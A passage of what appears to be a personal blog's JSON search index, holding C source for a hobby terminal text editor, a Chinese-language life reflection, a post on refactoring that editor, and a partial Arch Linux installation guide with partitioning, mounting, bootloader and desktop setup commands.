class=\"n\">temp</span><span class=\"p\">;</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"p\">(</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">--</span><span class=\"p\">;</span><span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);}</span>\n  <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"cm\">/*if (ch==127)\n  {\n  a[x][y]=' ';\n  prin(1);\n  return 1;\n  }*/</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"mi\">23</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"n\">fw</span><span class=\"p\">();</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"mi\">18</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"n\">fr</span><span class=\"p\">();</span>\n  <span class=\"n\">format</span><span class=\"p\">();</span>\n  <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"kt\">int</span> <span class=\"nf\">cursor</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"mi\">27</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"mi\">91</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"sc\">'A'</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">&lt;</span><span class=\"n\">y</span><span class=\"p\">)</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">];}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"p\">(</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">--</span><span class=\"p\">;</span>\n  <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"sc\">'B'</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"n\">height</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">==</span><span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">&lt;</span><span class=\"n\">y</span><span class=\"p\">)</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">];}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"mi\">22</span><span class=\"o\">+</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">++</span><span class=\"p\">;</span>\n  <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"sc\">'D'</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"k\">else</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">];</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"p\">(</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">--</span><span class=\"p\">;</span><span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">2</span><span class=\"p\">);}</span>\n  <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"sc\">'C'</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">y</span><span class=\"o\">&lt;</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">])</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&lt;</span><span class=\"n\">dwidth</span><span class=\"p\">))</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span> <span class=\"k\">else</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">])</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"n\">height</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"mi\">22</span><span class=\"o\">+</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">++</span><span class=\"p\">;}</span>\n  <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"mi\">27</span><span class=\"p\">)</span>  <span class=\"k\">return</span> <span class=\"mi\">2</span><span class=\"p\">;</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"kt\">void</span> <span class=\"nf\">prin</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">n</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"n\">dstart</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">dstart</span><span class=\"o\">+</span><span class=\"mi\">22</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">j</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">j</span><span class=\"o\">&lt;=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">];</span><span class=\"n\">j</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"%c\"</span><span class=\"p\">,</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"p\">)]);</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">i</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"p\">)]</span><span class=\"o\">==</span><span class=\"sc\">'\\n'</span><span class=\"p\">)</span> <span class=\"n\">flag</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">flag</span><span class=\"o\">==</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n    <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">gotoxy</span><span class=\"p\">(</span><span class=\"mi\">61</span><span class=\"p\">,</span><span class=\"mi\">24</span><span class=\"p\">);</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Powered by LEXUGE\"</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">gotoxy</span><span class=\"p\">(</span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"mi\">24</span><span class=\"p\">);</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"X:%d Y:%d \"</span><span class=\"p\">,</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">);</span>\n  <span class=\"n\">gotoxy</span><span class=\"p\">(</span><span class=\"n\">y</span><span class=\"p\">,(</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"n\">dstart</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">));</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">//主函数循环处理\n</span>\n<span class=\"kt\">int</span> <span class=\"nf\">main</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n   <span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">;</span>\n   <span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">key1</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n   <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n   <span class=\"n\">init</span><span class=\"p\">();</span>\n   <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n   <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n   <span class=\"p\">{</span>\n   <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n   <span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"n\">getch</span><span class=\"p\">();</span>\n   <span class=\"n\">key1</span><span class=\"o\">=</span><span class=\"n\">ch</span><span class=\"p\">;</span>\n   <span class=\"n\">n</span><span class=\"o\">=</span><span class=\"n\">cursor</span><span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"p\">);</span>\n   <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">n</span><span class=\"o\">==</span><span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">clrscr</span><span class=\"p\">();</span><span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;}</span>\n   <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">n</span><span class=\"o\">==</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n   <span class=\"n\">n</span><span class=\"o\">=</span><span class=\"n\">ctrkey</span><span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"p\">);</span>\n   <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">key1</span><span class=\"o\">&gt;=</span><span class=\"mi\">32</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">key1</span><span class=\"o\">&lt;=</span><span class=\"mi\">126</span><span class=\"p\">))</span>\n   <span class=\"n\">n</span><span class=\"o\">=</span><span class=\"n\">key</span><span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"p\">);</span>\n   <span class=\"p\">}</span>\n   <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</code></pre>\n</div>\n"
    } ,
  
    {
      "title"    : "生活总结",
      "category" : "",
      "tags"     : "生活, 随笔",
      "url"      : "/jekyll/update/2017/04/08/%E7%94%9F%E6%B4%BB%E6%80%BB%E7%BB%93.html",
      "date"     : "2017-04-08 17:41:00 +0800",
      "content"  : "<blockquote>\n  <p>回顾过去，展望未来！<br />\n过去的日子回不来，但可以回望。好多年过去了，不论是从计划上还是技术上，抑或是感悟，我一直在发生巨大的变化。</p>\n</blockquote>\n\n<ol>\n  <li>\n    <p><strong>计划</strong><br />\n过去，我一直是一个没有计划，节奏很乱的人。但是事情足够少，大脑自己排序、计划能够应付地过来。但是，升入初中后，事情多了起来，更为杂乱无章，依靠大脑那些少得可怜的RAM，以及想象能力的局限，已经很难排好计划了。<br />\n所以，我的身边多了一本本子——手帐。<br />\n手帐：来源于日本的说法，指的是手帐一族每日都会用的、甚至随身携带的一个本子。这个本子可能只是单纯的日记本，也可以兼具日程管理、行事计划等功能，也有人用来记录料理日记、旅行笔记等。简而言之，就是一个整理生活的本子。<br />\n手帐很好地解决了我上述的问题，并且还附加了一个效果——有效的克服了我“另开炉灶，令起一本”的问题。同时，也有锻炼我有头有尾的做事习惯的好处。<br />\n我的手帐还包含各种项目计划，许多的更新以及项目都诞生其中:LEDIT更新，GAMEOX更新，XCH创建，有具体的也有宏观的，实现的计划写在上面后，效率明显高了许多。</p>\n  </li>\n  <li>\n    <p><strong>编程与技术</strong><br />\n这个的变化就更大了。事实上，大多数的项目都诞生在几年前——我还在读小学的时候。比如:LEDIT，GAMEOX。GAMEOX的诞生是因为我想把同学间的一个小游戏电子化。而LEDIT的诞生则是对文本编辑器以及终端界面的极致热爱。<br />\n我的技术理念也在不断地发生变化，例如:我会更偏向于模块化编程，以及通用解决方案。我对算法的依赖与重视也在逐步加强。事实上，初学者肯定感觉不到这些做法的好处，的确，这样很正常。但是，随着代码的逐渐增加，这些做法的好处会愈加明显。<br />\n作为一个强迫症患者&amp;&amp;完美主义者，尽管我只有一个人，但是，我却根本无法容忍BUG的发生。一旦有BUG出现，我就会想尽一切办法去处理。但是，毕竟我只是一个人，要承担设计、编写、维护的所有工作。所以，我的项目很少——只有三个。我基本上会在一段时间内创建/维护一个项目，并将它保持到完美状态。这时候，再完成其他项目。所以，按照我的性格，BUG一定是会修复的，只是时间问题。我承诺，目前的三个项目我都会终身维护。</p>\n  </li>\n  <li>\n    <p><strong>学习</strong><br />\n近段时间的学习有些吃力，但是很快就会好转。对我来说，其实学习的知识多难都没有问题，跨度多大也不是难点。很多时候，我缺少的是想要学习的动力，所以，我一直在日常生活中寻求竞争。因为，我觉得，竞争是有趣的。<br />\n但是，对我而言，连续的失利抑或迎头痛击都会对我或多或少的带来一些影响。我的学习或许还是充满许多的心理/不稳定因素。『状态』在现阶段还是对我至关重要的。未来，我的学习『容错能力』还是需要不断地加强。</p>\n  </li>\n  <li>\n    <p><strong>未来</strong><br />\n未来还是以学习为重吧，不论如何，我的兴趣永远不减。</p>\n  </li>\n</ol>\n"
    } ,
  
    {
      "title"    : "LEDIT全面更新介绍",
      "category" : "",
      "tags"     : "编程, 项目",
      "url"      : "/jekyll/update/2017/04/03/LEDIT%E5%85%A8%E9%9D%A2%E6%9B%B4%E6%96%B0%E4%BB%8B%E7%BB%8D.html",
      "date"     : "2017-04-03 20:03:00 +0800",
      "content"  : "<blockquote>\n  <p>今天，我对LEDIT进行了总计长达9小时的代码重构，将数据结构从二维数组迁移到更为便于管理的一维数组上。终于实现了基本编辑器的功能：读入，保存，编辑以及简易的加密功能。</p>\n</blockquote>\n\n<p><strong>动态演示</strong>:<br />\n<script type=\"text/javascript\" src=\"https://asciinema.org/a/43rh0ovp7hpr0bwuhr6nfpskg.js\" id=\"asciicast-43rh0ovp7hpr0bwuhr6nfpskg\" async=\"\" data-size=\"medium\"></script></p>\n\n<p><strong>截图</strong>:<br />\n<img src=\"/image/LEDIT-demo1.png\" alt=\"\" /></p>\n\n<p><img src=\"/image/LEDIT-demo2.png\" alt=\"\" /></p>\n\n<p>将二维数组迁移到一维数组，这样，编辑模式就会更接近于现代的编辑器:gedit,vim,nano等。虽然目前功能十分简易，但是已经基本实现文本编辑器的雏形。<br />\n以前的二维数组在进行文本插入时，你需要考虑大量的问题：是否到达行末等。处理起来十分麻烦，代码重用率也不高，代码编写起来极为拖沓。<br />\n在更新之后，编辑器的整体感觉体验起来棒极了！LEDIT在处理极端文本格式(列数超长)等问题上，对文本原有格式的兼容和处理也好多了。更不会出现原有二位数组保存的文件空白部分为空格导致的在其他编辑器上改写起来棘手的问题。可以说，这次更新，是编辑器易用性以及与其他编辑器兼容性的一次巨大突破。</p>\n\n<p><strong>技术细节</strong></p>\n<ul>\n  <li>key point:<br />\nkey point是指换行的标记，也就是每行的列宽。在更新中，我为了提高代码的重用率，编写了format函数。</li>\n  <li>插入文本:<br />\n关于插入文本，我将格式和字符分开处理，读入的数据如果是在行末加入，那么不用插入，否则，将光标后的字符全部移后，并插入。这里，我将换行符也插入了。</li>\n</ul>\n"
    } ,
  
    {
      "title"    : "Arch安装完全指南",
      "category" : "",
      "tags"     : "Linux, 计算机技巧",
      "url"      : "/jekyll/update/2017/03/24/Arch%E5%AE%89%E8%A3%85%E5%AE%8C%E5%85%A8%E6%8C%87%E5%8D%97.html",
      "date"     : "2017-03-24 17:34:00 +0800",
      "content"  : "<p><a href=\"https://wiki.archlinux.org/index.php/Main_page\">Arch Wiki</a><br />\n<a href=\"https://www.archlinux.org/\">Arch官网</a><br />\n<a href=\"https://www.archlinux.org/download/\">Arch下载页面</a><br />\n<a href=\"https://wiki.archlinux.org/index.php/Installation_guide\">Arch Wiki安装教程</a><br />\n<img src=\"/image/Arch桌面.png\" alt=\"\" /></p>\n\n<p><img src=\"/image/Arch-scr.png\" alt=\"\" /></p>\n<blockquote>\n  <p>Arch Linux, a lightweight and flexible Linux® distribution that tries to Keep It Simple.</p>\n</blockquote>\n\n<p>Arch是我最喜欢的Linux滚动发行版，在我心中的地位基本与Fedora一致。新手在安装Arch时会遇到大量的困难，当然，对于新手，我也不推荐你来使用Arch。事实上，只要你有过半年或几个月以上的Linux使用经验，你就一定能够顺利安装完成Arch，整个安装过程中你最大的问题是克服终端操作的心理障碍。<br />\n下面，我们就开始吧！</p>\n\n<ol>\n  <li>安装之前：<br />\n首先，我们在<a href=\"https://www.archlinux.org/download/\">Arch下载页面</a>下载Arch的Live CD并烧录进U盘。开机U盘启动Live CD。<br />\nArch的安装少不了网络。所以，在安装之前我们需要进行联网。<br />\n这里我们不进行有线网络的教程（在启动Arch Live CD之前插入网线即可），下面我们连接无线网络：<br />\n我们为了简便，创建一个shell脚本来进行连接。\n<code class=\"highlighter-rouge\">nano wifi.sh</code>\n在nano编辑器的界面中，我们写入如下命令，并按Ctrl+O保存，Ctrl+X退出：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code><span class=\"c\">#! /bin/bash</span>\n<span class=\"nb\">echo</span> ---Init---\nrfkill unblock wifi\nrfkill unblock all\nip link <span class=\"nb\">set </span>wlp2s0 up\n<span class=\"nb\">echo</span> ---Input---\n<span class=\"nb\">echo</span> -n SSID:\n<span class=\"nb\">read </span>ssid\n<span class=\"nb\">echo</span> -n password:\n<span class=\"nb\">read</span> -s pass\n<span class=\"nb\">echo </span>You will connect the <span class=\"nv\">$ssid</span>\n<span class=\"nb\">echo</span> ---state---\n<span class=\"nb\">echo</span> <span class=\"s2\">\"(Connect the WLAN)\"</span>\nwpa_supplicant -B -i wlp2s0 -c &lt;<span class=\"o\">(</span>wpa_passphrase <span class=\"nv\">$ssid</span> <span class=\"nv\">$pass</span><span class=\"o\">)</span>\n<span class=\"nb\">echo</span> <span class=\"s2\">\"(DHCP)\"</span>\ndhcpcd wlp2s0\n</code></pre>\n    </div>\n    <p>将SSID和password替换成你的Wi-Fi名称和密码。<br />\n输入<code class=\"highlighter-rouge\">chmod a+x wifi.sh</code>并执行<code class=\"highlighter-rouge\">./wifi.sh</code>来启动无线网络<br />\n使用ping来验证网络：<code class=\"highlighter-rouge\">ping -c 3 archlinux.org</code></p>\n  </li>\n  <li>磁盘分区与挂载：<br />\n为了较为简便地进行分区，我们选用<code class=\"highlighter-rouge\">cfdisk</code>来进行分区。<br />\n执行<code class=\"highlighter-rouge\">cfdisk</code>进入界面，根据情况选择分区表，下面是我们的分区方案：\n    <ul>\n      <li>设置一个分区 100M～3G（标记为boot）<code class=\"highlighter-rouge\">/dev/sda1</code></li>\n      <li>设置一个分区 大小与你的内存相等 <code class=\"highlighter-rouge\">/dev/sda2</code></li>\n      <li>将剩余的空间都用于一个分区 <code class=\"highlighter-rouge\">/dev/sda3</code><br />\n保存分区，退出<br />\n在我们格式化之前，我们需要执行<code class=\"highlighter-rouge\">reboot</code>重启<br />\n重启完毕后执行：\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>mkfs.ext4 /dev/sda1\nmkfs.ect4 /dev/sda3\nmkswap /dev/sda2\n</code></pre>\n        </div>\n        <p>这样我们就格式化完毕了</p>\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>swapon /dev/sda2\nmount /dev/sda3 /mnt\ncd /mnt\nmkdir boot\nmount /dev/sda1 /mnt/boot\n</code></pre>\n        </div>\n        <p>这样，我们就挂载上了分区<br />\n至此，这部分完毕</p>\n      </li>\n    </ul>\n  </li>\n  <li>安装ArchLinux：<br />\n为了加速安装，我们添加清华大学的软件源，使用这条命令：\n<code class=\"highlighter-rouge\">nano /etc/pacman.d/mirrorlist</code><br />\n在开头添加：\n<code class=\"highlighter-rouge\">Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</code><br />\n使用<code class=\"highlighter-rouge\">pacman -Syy</code>更新软件源<br />\n最后使用<code class=\"highlighter-rouge\">pacstrap /mnt base base-devel</code>来安装系统<br />\n安装完成后使用：<code class=\"highlighter-rouge\">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</code>建立挂载关系<br />\n自此，系统就安装好了，但因为没有安装引导程序，<strong>切勿重启</strong><br />\n首先我们进入新安装的系统：\n<code class=\"highlighter-rouge\">arch-chroot /mnt /bin/bash</code><br />\n下载grub引导程序：\n<code class=\"highlighter-rouge\">pacman -S grub</code><br />\n然后在sda设备上生成配置文件：\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>grub-install /dev/sda\ngrub-mkconfig -o /boot/grub/grub.cfg\n</code></pre>\n    </div>\n    <p>切记是sda而不是sda1<br />\n如此，安装彻底完成，现在我们可以重启了！</p>\n  </li>\n  <li>配置ArchLinux：\n    <ul>\n      <li>配置语言环境<br />\n使用nano编辑器编辑配置文件：<code class=\"highlighter-rouge\">nano /etc/locale.gen</code>（Ctrl+v向下翻页，Ctrl+y向上翻页）<br />\n去掉en_US.UTF-8和zh_CN.UTF-8的注释并保存退出<br />\n然后使用<code class=\"highlighter-rouge\">locale-gen</code>生成编码<br />\n并配置优先为英文：<code class=\"highlighter-rouge\">echo LANG=en_US.UTF-8 &gt; /etc/locale.conf</code></li>\n      <li>配置时间\n        <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>rm /etc/localtime\nln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime\n</code></pre>\n        </div>\n        <p>使用<code class=\"highlighter-rouge\">date</code>查看时间对不对</p>\n      </li>\n      <li>配置主机名\n<code class=\"highlighter-rouge\">echo name &gt; /etc/hostname</code><br />\n将name替换为你的主机名</li>\n      <li>配置root密码\n<code class=\"highlighter-rouge\">passwd</code>输入root密码</li>\n      <li>创建用户\n<code class=\"highlighter-rouge\">useradd -m -G wheel -s /bin/bash name</code><br />\n将name替换为你的用户名<br />\n然后设置密码：<code class=\"highlighter-rouge\">passwd name</code><br />\n-为用户添加sudo权限<br />\n安装sudo：\n<code class=\"highlighter-rouge\">pacman -S sudo</code><br />\n使用<code class=\"highlighter-rouge\">visudo</code>来编辑sudo配置文件<br />\n将wheel用户组的权限注释去除<br />\n按shift+zz保存退出<br />\n使用<code class=\"highlighter-rouge\">su name</code>切换用户并使用<code class=\"highlighter-rouge\">sudo reboot</code>测试sudo</li>\n    </ul>\n  </li>\n  <li>安装桌面：<br />\n第一步安装xorg：\n<code class=\"highlighter-rouge\">sudo pacman -Syu xorg xorg-xinit xorg-utils dbus</code><br />\n然后安装gnome:\n<code class=\"highlighter-rouge\">sudo pacman -Syu gnome gnome-extra</code><br />\ngnome-extra可不安装<br />\n安装完毕之后，拷贝一份xinit的初始化配置文件到用户目录下\n<code class=\"highlighter-rouge\">cp /etc/X11/xinit/xinitrc ~/.xinitrc</code><br />\n接下来用nano编辑它，翻到最后，把从twm &amp;开始到末尾的信息全部注释掉，然后添加gnome的启动参数\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>export XDG_CURRENT_DESKTOP=GNOME-Classic:GNOME\nexport GNOME_SHELL_SESSION_MODE=classic\nexec gnome-session --session=gnome-classic\n</code></pre>\n    </div>\n    <p>接下来我们就可以<code class=\"highlighter-rouge\">startx</code>来启动桌面了，若启动不起来，安装xterm或对root的配置文件也进行同样操作<br />\n下面，我们来安装自动登陆程序gdm：</p>\n    <div class=\"highlighter-rouge\"><pre class=\"highlight\"><code>sudo pacman -Syu gdm\nsudo systemctl enable gdm\nsudo systemctl start gdm\n</code></pre>\n    </div>\n  </li>\n  <li>环境设置：\n    <ul>\n      <li>字体<br />\n使用<code class=\"highlighter-rouge\">pacman -Ss font</code>搜索你喜欢的字体<br />\n推荐安装：<code class=\"highlighter-rouge\">sudo pacman -S ttf-dejavu wqy-microhei 